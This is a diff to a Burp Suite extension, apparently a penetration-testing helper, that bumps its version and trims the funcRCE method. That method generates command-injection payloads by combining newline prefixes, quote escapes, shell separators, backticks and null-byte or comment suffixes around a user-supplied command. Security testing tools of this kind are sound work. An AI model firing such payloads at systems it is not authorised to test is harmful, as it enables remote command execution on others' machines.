@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.55"
+VERSION = "0.56"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
@@ -290,29 +290,27 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         return
 
     def funcRCE(self, ev):
-        listRCE = []
-        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a"]
-        escapeChars = ["",  "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
+        listRCE = []        
+        prefixes = ["", "\\n", "\\r\\n", "%0a", "%0d%0a"]
+        escapeChars = ["",  "'", "\\'", "\"", "\\\""]
         separators = ["&", "&&", "|", "||", ";"]
-        suffixes = [" #", " ::", " %00", " 0x00"]
+        suffixes = [" #", " ::", " %00"]
         
         for prefix in prefixes:
             for escapeChar in escapeChars:
                 for separator in separators:
                     for suffix in suffixes:
-                        if prefix[:2].count("\\") == escapeChar[:2].count("\\") or prefix.find('\\') or escapeChar.find('\\'):
-                            listRCE.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
-                            listRCE.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
-                            if escapeChar:
-                                listRCE.append(prefix + separator + self._txtTargetPath.text + escapeChar + suffix + "\n")
-                                listRCE.append(prefix + escapeChar + separator + self._txtTargetPath.text + suffix + "\n")
+                        listRCE.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
+                        listRCE.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
+                        if escapeChar:
+                            listRCE.append(prefix + separator + self._txtTargetPath.text + escapeChar + suffix + "\n")
+                            listRCE.append(prefix + escapeChar + separator + self._txtTargetPath.text + suffix + "\n")
                         if suffix != " ::":
                             listRCE.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")                            
-                            if prefix[:2].count("\\") == escapeChar[:2].count("\\") or prefix.find('\\') or escapeChar.find('\\'):
-                                listRCE.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
-                                if escapeChar:    
-                                    listRCE.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + suffix + "\n")
-                                    listRCE.append(prefix + "`" + self._txtTargetPath.text + "`" + escapeChar + suffix + "\n")
+                            listRCE.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
+                            if escapeChar:    
+                                listRCE.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + suffix + "\n")
+                                listRCE.append(prefix + "`" + self._txtTargetPath.text + "`" + escapeChar + suffix + "\n")
                         listRCE.append(prefix + self._txtTargetPath.text + "\n")
                     listRCE.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")            
             listRCE.append(prefix + self._txtTargetPath.text + "\n")
